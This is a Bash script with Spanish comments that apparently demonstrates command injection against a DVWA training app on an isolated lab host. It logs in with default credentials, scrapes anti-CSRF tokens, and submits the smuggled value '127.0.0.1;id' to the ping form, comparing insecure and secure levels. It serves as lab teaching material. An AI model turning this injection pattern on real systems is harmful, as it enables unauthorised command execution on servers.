#!/bin/bash
# webtest.sh -- primer test de seguridad web contra DVWA (laboratorio AISLADO 10.13.37.30).
# Demuestra una INYECCION DE COMANDOS y, en el nivel seguro, como el codigo la bloquea.
#
#   ./webtest.sh low         -> nivel inseguro: la inyeccion SE EJECUTA  (uid=33 www-data)
#   ./webtest.sh impossible  -> nivel seguro:  la inyeccion REBOTA       (sin uid)
#
# Solo contra mi propia maquina del laboratorio aislado. Educativo y de defensa.
set -u
URL="http://10.13.37.30"          # DVWA en mi laboratorio aislado, sin salida a internet
LEVEL="${1:-low}"                 # nivel de seguridad de DVWA (low | impossible)
JAR="$(mktemp)"                   # galleta de sesion (cookie jar)
PAYLOAD="127.0.0.1;id"            # ping a localhost  +  ;  +  comando colado a traves del formulario

# Extrae el token anti-CSRF (campo oculto user_token) del HTML de una pagina.
token() { grep -oE "user_token' value='[0-9a-f]+'" | grep -oE '[0-9a-f]{16,}' | head -1; }

echo "[1] Pido login.php y robo el token anti-CSRF (user_token)..."
T1=$(curl -s -c "$JAR" "$URL/login.php" | token)
echo "    user_token = $T1"

echo "[2] Inicio sesion como admin enviando el token con las credenciales..."
curl -s -b "$JAR" -c "$JAR" -L \
     --data-urlencode "username=admin" \
     --data-urlencode "password=password" \
     --data-urlencode "user_token=$T1" \
     --data "Login=Login" "$URL/login.php" >/dev/null

echo "[3] Fijo el nivel de seguridad de DVWA en: $LEVEL"
T2=$(curl -s -b "$JAR" -c "$JAR" "$URL/security.php" | token)
curl -s -b "$JAR" -c "$JAR" \
     --data "security=$LEVEL" \
     --data "seclev_submit=Submit" \
     --data-urlencode "user_token=$T2" "$URL/security.php" >/dev/null

echo "[4] Ataco el formulario de ping con:  ip = $PAYLOAD"
EXEC="$URL/vulnerabilities/exec/"
T3=$(curl -s -b "$JAR" -c "$JAR" "$EXEC" | token)
OUT=$(curl -s -b "$JAR" -c "$JAR" \
      --data-urlencode "ip=$PAYLOAD" \
      --data "Submit=Submit" \
      --data-urlencode "user_token=$T3" "$EXEC")

echo "---------------- respuesta del servidor ----------------"
if echo "$OUT" | grep -q "uid="; then
    echo "$OUT" | grep -oE "uid=[0-9].*" | head -1
    echo ">>> INYECCION EJECUTADA: el servidor corrio NUESTRO comando (id)."
else
    echo "(sin salida de comando: no aparece ningun uid)"
    echo ">>> INYECCION BLOQUEADA: el codigo seguro valido la entrada."
fi
rm -f "$JAR"
